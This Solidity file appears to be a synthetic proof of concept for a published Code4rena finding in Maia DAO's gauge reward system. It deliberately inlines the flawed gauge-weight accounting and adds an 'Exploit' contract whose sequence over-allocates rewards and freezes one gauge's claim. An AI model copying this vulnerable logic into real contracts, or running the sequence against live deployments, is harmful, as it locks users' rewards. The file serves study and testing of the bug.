// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Maia DAO (ERC-20 Gauges / FlywheelGaugeRewards) — Re-adding a deprecated gauge
    in a new epoch before calling queueRewardsForCycle() leaves gauges without
    rewards (Code4rena 2023-05, [H-13], finding #26047)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    ERC20Gauges._addGauge / _writeGaugeWeight / _getStoredWeight / calculateGaugeAllocation
    and the FlywheelGaugeRewards queueRewardsForCycle / _queueRewards / getAccruedRewards
    are inlined VERBATIM. The blamed sequence:

        // _addGauge, when re-adding a deprecated gauge with preserved weight:
        weight = _getGaugeWeight[gauge].currentWeight;
        if (weight > 0) { _writeGaugeWeight(_totalWeight, _add112, weight, currentCycle); } // @> sets _totalWeight.currentCycle = currentCycle

        // then _getStoredWeight, read during the SAME cycle's queueRewardsForCycle:
        return gaugeWeight.currentCycle < currentCycle ? gaugeWeight.currentWeight : gaugeWeight.storedWeight;

    Re-adding a deprecated gauge (which still carries its old vote weight) in a NEW cycle
    but BEFORE queueRewardsForCycle bumps `_totalWeight.currentCycle` to the current cycle.
    So `_getStoredWeight(_totalWeight, currentCycle)` returns the STALE (lower) storedWeight
    instead of the freshly-increased currentWeight, while each gauge's own weight still reads
    at full value. The per-gauge allocations therefore sum to MORE than the reward pool, and
    the last gauge(s) to call getAccruedRewards revert (their rewards are frozen).

    The minter reward stream is reduced to a fixed per-cycle mint; block.timestamp-based
    cycle progression is replaced by an explicit, settable clock (advanceCycle) so no
    cheatcodes are needed. The gauge-weight cycle accounting and the reward queue/claim
    logic are verbatim, so the over-allocation and the frozen-gauge revert are faithful.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal set of addresses (OZ EnumerableSet.AddressSet subset).
library AddressSet {
    struct Set {
        address[] _values;
        mapping(address => uint256) _indexes; // value => index+1
    }

    function add(Set storage set, address v) internal returns (bool) {
        if (set._indexes[v] != 0) return false;
        set._values.push(v);
        set._indexes[v] = set._values.length;
        return true;
    }

    function remove(Set storage set, address v) internal returns (bool) {
        uint256 idx = set._indexes[v];
        if (idx == 0) return false;
        uint256 toDelete = idx - 1;
        uint256 last = set._values.length - 1;
        if (toDelete != last) {
            address lastVal = set._values[last];
            set._values[toDelete] = lastVal;
            set._indexes[lastVal] = idx;
        }
        set._values.pop();
        delete set._indexes[v];
        return true;
    }

    function contains(Set storage set, address v) internal view returns (bool) {
        return set._indexes[v] != 0;
    }

    function values(Set storage set) internal view returns (address[] memory) {
        return set._values;
    }

    function length(Set storage set) internal view returns (uint256) {
        return set._values.length;
    }
}

/// @dev Minimal reward ERC20.
contract MockERC20 {
    string public name = "Reward";
    string public symbol = "RWD";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt; // reverts on underflow -> the frozen-gauge symptom
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced ERC20Gauges. Weight/cycle accounting verbatim; user-vote layer trimmed.
contract ERC20Gauges {
    using AddressSet for AddressSet.Set;

    error InvalidGaugeError();

    event AddGauge(address indexed gauge);
    event RemoveGauge(address indexed gauge);

    struct Weight {
        uint112 storedWeight;
        uint112 currentWeight;
        uint32 currentCycle;
    }

    uint32 public immutable gaugeCycleLength;

    mapping(address => Weight) internal _getGaugeWeight;
    Weight internal _totalWeight;

    AddressSet.Set internal _gauges;
    AddressSet.Set internal _deprecatedGauges;

    // Settable clock (replaces block.timestamp so cycles advance without cheatcodes).
    uint256 public mockNow;

    constructor(uint32 _gaugeCycleLength) {
        gaugeCycleLength = _gaugeCycleLength;
    }

    function _now() internal view returns (uint32) {
        return uint32(mockNow);
    }

    function setNow(uint256 t) external {
        mockNow = t;
    }

    function advanceCycle() external {
        mockNow += gaugeCycleLength;
    }

    /*//////////////// cycle + stored-weight helpers (VERBATIM) ////////////////*/
    function _getGaugeCycleEnd() internal view returns (uint32) {
        uint32 nowPlusOneCycle = _now() + gaugeCycleLength;
        unchecked {
            return (nowPlusOneCycle / gaugeCycleLength) * gaugeCycleLength;
        }
    }

    function _getStoredWeight(Weight storage gaugeWeight, uint32 currentCycle) internal view returns (uint112) {
        return gaugeWeight.currentCycle < currentCycle ? gaugeWeight.currentWeight : gaugeWeight.storedWeight;
    }

    function getGaugeWeight(address gauge) external view returns (uint112) {
        return _getGaugeWeight[gauge].currentWeight;
    }

    function totalWeight() external view returns (uint112) {
        return _totalWeight.currentWeight;
    }

    function gauges() external view returns (address[] memory) {
        return _gauges.values();
    }

    /*//////////////// calculateGaugeAllocation (VERBATIM) ////////////////*/
    function calculateGaugeAllocation(address gauge, uint256 quantity) external view returns (uint256) {
        if (_deprecatedGauges.contains(gauge)) return 0;
        uint32 currentCycle = _getGaugeCycleEnd();

        uint112 total = _getStoredWeight(_totalWeight, currentCycle);
        uint112 weight = _getStoredWeight(_getGaugeWeight[gauge], currentCycle);
        return (quantity * weight) / total;
    }

    /*//////////////// _writeGaugeWeight (VERBATIM) ////////////////*/
    function _writeGaugeWeight(
        Weight storage weight,
        function(uint112, uint112) view returns (uint112) op,
        uint112 delta,
        uint32 cycle
    ) private {
        uint112 currentWeight = weight.currentWeight;
        uint112 stored = weight.currentCycle < cycle ? currentWeight : weight.storedWeight;
        uint112 newWeight = op(currentWeight, delta);

        weight.storedWeight = stored;
        weight.currentWeight = newWeight;
        weight.currentCycle = cycle;
    }

    function _add112(uint112 a, uint112 b) private pure returns (uint112) {
        return a + b;
    }

    function _subtract112(uint112 a, uint112 b) private pure returns (uint112) {
        return a - b;
    }

    /*//////////////// user weight allocation (trimmed of bribes/votes) ////////////////*/
    function incrementGauge(address gauge, uint112 weight) external {
        uint32 currentCycle = _getGaugeCycleEnd();
        _incrementGaugeWeight(gauge, weight, currentCycle);
        _writeGaugeWeight(_totalWeight, _add112, weight, currentCycle);
    }

    function _incrementGaugeWeight(address gauge, uint112 weight, uint32 cycle) internal {
        if (!_gauges.contains(gauge) || _deprecatedGauges.contains(gauge)) revert InvalidGaugeError();
        _writeGaugeWeight(_getGaugeWeight[gauge], _add112, weight, cycle);
    }

    /*//////////////// addGauge / _addGauge (VERBATIM — the VULN re-add) ////////////////*/
    function addGauge(address gauge) external returns (uint112) {
        return _addGauge(gauge);
    }

    function _addGauge(address gauge) internal returns (uint112 weight) {
        bool newAdd = _gauges.add(gauge);
        bool previouslyDeprecated = _deprecatedGauges.remove(gauge);
        // add and fail loud if zero address or already present and not deprecated
        if (gauge == address(0) || !(newAdd || previouslyDeprecated)) revert InvalidGaugeError();

        uint32 currentCycle = _getGaugeCycleEnd();

        // Check if some previous weight exists and re-add to the total. Gauge and user weights are preserved.
        weight = _getGaugeWeight[gauge].currentWeight;
        if (weight > 0) {
            _writeGaugeWeight(_totalWeight, _add112, weight, currentCycle); // @> VULN: bumps _totalWeight.currentCycle to currentCycle, so _getStoredWeight returns the STALE storedWeight this cycle
        }

        emit AddGauge(gauge);
    }

    /*//////////////// removeGauge / _removeGauge (VERBATIM) ////////////////*/
    function removeGauge(address gauge) external {
        _removeGauge(gauge);
    }

    function _removeGauge(address gauge) internal {
        if (!_deprecatedGauges.add(gauge)) revert InvalidGaugeError();

        uint32 currentCycle = _getGaugeCycleEnd();

        uint112 weight = _getGaugeWeight[gauge].currentWeight;
        if (weight > 0) {
            _writeGaugeWeight(_totalWeight, _subtract112, weight, currentCycle);
        }

        emit RemoveGauge(gauge);
    }
}

/// @notice Reduced FlywheelGaugeRewards. queueRewardsForCycle / _queueRewards /
///         getAccruedRewards are verbatim; the minter stream is a fixed per-cycle mint.
contract FlywheelGaugeRewards {
    error CycleError();
    error EmptyGaugesError();

    event CycleStart(uint32 indexed cycleStart, uint256 rewardAmount);
    event QueueRewards(address indexed gauge, uint32 indexed cycle, uint256 rewardAmount);

    struct QueuedRewards {
        uint112 priorCycleRewards;
        uint112 cycleRewards;
        uint32 storedCycle;
    }

    MockERC20 public immutable rewardToken;
    ERC20Gauges public immutable gaugeToken;
    uint32 public immutable gaugeCycleLength;

    uint32 public gaugeCycle;
    uint112 internal nextCycleQueuedRewards;
    uint256 public immutable cycleRewardAmount; // fixed minter stream per cycle

    mapping(address => QueuedRewards) public gaugeQueuedRewards;

    constructor(MockERC20 _rewardToken, ERC20Gauges _gaugeToken, uint256 _cycleRewardAmount) {
        rewardToken = _rewardToken;
        gaugeToken = _gaugeToken;
        gaugeCycleLength = _gaugeToken.gaugeCycleLength();
        cycleRewardAmount = _cycleRewardAmount;
        gaugeCycle = 0; // seed
    }

    /// @dev Reduced minter stream: mint the fixed cycle reward into this contract.
    function _pullCycleRewards() internal returns (uint256) {
        rewardToken.mint(address(this), cycleRewardAmount);
        return cycleRewardAmount;
    }

    /*//////////////// queueRewardsForCycle (VERBATIM shape) ////////////////*/
    function queueRewardsForCycle() external returns (uint256 totalQueuedForCycle) {
        // (minter.updatePeriod() reduced away)

        // next cycle is always the next even divisor of the cycle length above current block timestamp.
        uint32 currentCycle = (gaugeToken.mockNow().toUint32() / gaugeCycleLength) * gaugeCycleLength;
        uint32 lastCycle = gaugeCycle;

        // ensure new cycle has begun
        if (currentCycle <= lastCycle) revert CycleError();

        gaugeCycle = currentCycle;

        // queue the rewards stream and sanity check the tokens were received
        uint256 balanceBefore = rewardToken.balanceOf(address(this));
        totalQueuedForCycle = _pullCycleRewards();
        require(rewardToken.balanceOf(address(this)) - balanceBefore >= totalQueuedForCycle);

        // include uncompleted cycle
        totalQueuedForCycle += nextCycleQueuedRewards;

        // iterate over all gauges and update the rewards allocations
        address[] memory gauges = gaugeToken.gauges();

        _queueRewards(gauges, currentCycle, lastCycle, totalQueuedForCycle);

        nextCycleQueuedRewards = 0;

        emit CycleStart(currentCycle, totalQueuedForCycle);
    }

    /*//////////////// _queueRewards (VERBATIM) ////////////////*/
    function _queueRewards(address[] memory gauges, uint32 currentCycle, uint32 lastCycle, uint256 totalQueuedForCycle)
        internal
    {
        uint256 size = gauges.length;
        if (size == 0) revert EmptyGaugesError();

        for (uint256 i = 0; i < size; i++) {
            address gauge = gauges[i];

            QueuedRewards memory queuedRewards = gaugeQueuedRewards[gauge];

            // Cycle queue already started
            require(queuedRewards.storedCycle < currentCycle);
            assert(queuedRewards.storedCycle == 0 || queuedRewards.storedCycle >= lastCycle);

            uint112 completedRewards = queuedRewards.storedCycle == lastCycle ? queuedRewards.cycleRewards : 0;
            uint256 nextRewards = gaugeToken.calculateGaugeAllocation(gauge, totalQueuedForCycle);
            require(nextRewards <= type(uint112).max); // safe cast

            gaugeQueuedRewards[gauge] = QueuedRewards({
                priorCycleRewards: queuedRewards.priorCycleRewards + completedRewards,
                cycleRewards: uint112(nextRewards),
                storedCycle: currentCycle
            });

            emit QueueRewards(gauge, currentCycle, nextRewards);
        }
    }

    /*//////////////// getAccruedRewards (VERBATIM) ////////////////*/
    function getAccruedRewards() external returns (uint256 accruedRewards) {
        QueuedRewards memory queuedRewards = gaugeQueuedRewards[msg.sender];

        uint32 cycle = gaugeCycle;
        bool incompleteCycle = queuedRewards.storedCycle > cycle;

        // no rewards
        if (queuedRewards.priorCycleRewards == 0 && (queuedRewards.cycleRewards == 0 || incompleteCycle)) {
            return 0;
        }

        // if stored cycle != 0 it must be >= the last queued cycle
        assert(queuedRewards.storedCycle >= cycle);

        // always accrue prior rewards
        accruedRewards = queuedRewards.priorCycleRewards;
        uint112 cycleRewardsNext = queuedRewards.cycleRewards;

        if (incompleteCycle) {
            // If current cycle queue incomplete, do nothing to current cycle rewards or accrued
        } else {
            accruedRewards += cycleRewardsNext;
            cycleRewardsNext = 0;
        }

        gaugeQueuedRewards[msg.sender] = QueuedRewards({
            priorCycleRewards: 0,
            cycleRewards: cycleRewardsNext,
            storedCycle: queuedRewards.storedCycle
        });

        if (accruedRewards > 0) rewardToken.transfer(msg.sender, accruedRewards); // reverts if the pool was over-allocated -> gauge frozen
    }
}

/// @dev toUint32 helper used by the flywheel (SafeCastLib subset).
library SafeCastLib {
    function toUint32(uint256 x) internal pure returns (uint32) {
        require(x <= type(uint32).max, "cast");
        return uint32(x);
    }
}

using SafeCastLib for uint256;

/// @notice A gauge: calls getAccruedRewards (msg.sender = this gauge address).
contract Gauge {
    function collect(FlywheelGaugeRewards fw) external returns (uint256) {
        return fw.getAccruedRewards();
    }

    function tryCollect(FlywheelGaugeRewards fw) external returns (bool reverted, uint256 amount) {
        try fw.getAccruedRewards() returns (uint256 a) {
            return (false, a);
        } catch {
            return (true, 0);
        }
    }
}

/// @notice Orchestrates the scenario: two gauges (25%/75%), deprecate the small one,
///         re-add it in a new cycle BEFORE queuing rewards, and show the whale gauge's
///         reward claim is bricked (frozen) by the resulting over-allocation.
contract Exploit {
    uint32 public constant CYCLE = 1000;
    uint256 public constant REWARDS = 100 ether; // per-cycle minter stream

    MockERC20 public rewardToken;
    ERC20Gauges public gaugeToken;
    FlywheelGaugeRewards public flywheel;
    Gauge public gauge1; // small (25%)
    Gauge public gauge2; // whale (75%)

    // observability
    uint256 public whaleQueuedCycle3;
    uint256 public smallAllocCycle3;
    uint256 public poolAtCycle3;
    bool public whaleBricked;
    uint256 public g1CollectedCycle3;

    constructor() {
        rewardToken = new MockERC20();                                   // CREATE(exploit, 1)
        gaugeToken = new ERC20Gauges(CYCLE);                             // CREATE(exploit, 2) — vulnerable
        flywheel = new FlywheelGaugeRewards(rewardToken, gaugeToken, REWARDS); // CREATE(exploit, 3)
        gauge1 = new Gauge();                                           // CREATE(exploit, 4)
        gauge2 = new Gauge();                                           // CREATE(exploit, 5)

        // t0: add both gauges and allocate a 25% / 75% vote split.
        gaugeToken.setNow(CYCLE); // aligned start (cycle end = 2*CYCLE)
        gaugeToken.addGauge(address(gauge1));
        gaugeToken.addGauge(address(gauge2));
        gaugeToken.incrementGauge(address(gauge1), 1e18);
        gaugeToken.incrementGauge(address(gauge2), 3e18);
    }

    function run() external {
        // === Cycle 1: normal ===
        gaugeToken.advanceCycle(); // -> mockNow = 2*CYCLE
        flywheel.queueRewardsForCycle();
        gauge1.collect(flywheel); // 25
        gauge2.collect(flywheel); // 75

        // Deprecate the small gauge (its vote weight is preserved in storage).
        gaugeToken.removeGauge(address(gauge1));

        // === Cycle 2: normal, only the whale is active ===
        gaugeToken.advanceCycle(); // -> mockNow = 3*CYCLE
        flywheel.queueRewardsForCycle();
        gauge2.collect(flywheel); // 100

        // === Cycle 3: re-add the deprecated gauge BEFORE queuing rewards ===
        gaugeToken.advanceCycle(); // -> mockNow = 4*CYCLE
        gaugeToken.addGauge(address(gauge1)); // the bug: bumps _totalWeight.currentCycle to this cycle
        flywheel.queueRewardsForCycle();

        // Snapshot the over-allocation: with a stale (too-low) total, the per-gauge
        // allocations sum to MORE than the freshly minted pool.
        (, uint112 g1Cyc,) = flywheel.gaugeQueuedRewards(address(gauge1));
        (, uint112 g2Cyc,) = flywheel.gaugeQueuedRewards(address(gauge2));
        smallAllocCycle3 = g1Cyc;
        whaleQueuedCycle3 = g2Cyc;

        // The re-added small gauge collects first (fine)...
        g1CollectedCycle3 = gauge1.collect(flywheel);

        // ...leaving the pool short of the whale's booked allocation.
        poolAtCycle3 = rewardToken.balanceOf(address(flywheel));

        // ...then the whale gauge tries to collect its booked rewards and REVERTS,
        // because the pool was over-allocated and is now short.
        (bool reverted,) = gauge2.tryCollect(flywheel);
        whaleBricked = reverted;

        // HARM: the whale gauge's earned rewards are frozen (getAccruedRewards reverts),
        // and the cycle-3 allocations exceed the actual reward pool.
        require(smallAllocCycle3 + whaleQueuedCycle3 > REWARDS, "allocations should exceed the pool");
        require(whaleQueuedCycle3 > poolAtCycle3, "whale booked more than the pool holds after g1 took its share");
        require(whaleBricked, "whale gauge reward claim must be bricked");
    }
}
